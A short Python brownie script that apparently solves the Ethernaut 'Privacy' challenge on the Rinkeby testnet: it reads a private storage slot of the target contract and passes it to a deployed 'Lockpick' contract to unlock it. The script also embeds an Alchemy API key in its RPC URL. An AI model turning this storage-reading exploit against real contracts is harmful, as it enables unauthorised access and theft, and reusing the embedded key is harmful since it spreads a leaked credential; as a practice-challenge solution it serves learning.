from multiprocessing import Lock
from scripts.helpful_scripts import *
from brownie import chain, Contract, Privacy, Lockpick
from web3 import Web3

privacy = Contract.from_abi(
    "Privacy", "0xa3d265248C22FF5df0621742A5d41AdFe317121B", Privacy.abi
)
account = getAccount()

w3 = Web3(
    Web3.HTTPProvider(
        "https://eth-rinkeby.alchemyapi.io/v2/e2HrX3zIlZIa3nI7nhUILDcL3L2WWldD"
    )
)


def main():
    lockpick = Lockpick.deploy({"from": account})
    # lockpick = Lockpick[-1]
    tx = lockpick.pick_lock(
        w3.eth.get_storage_at(privacy.address, 5),
        {
            "from": account,
        },
    )
    tx.wait(1)
    print(privacy.locked())
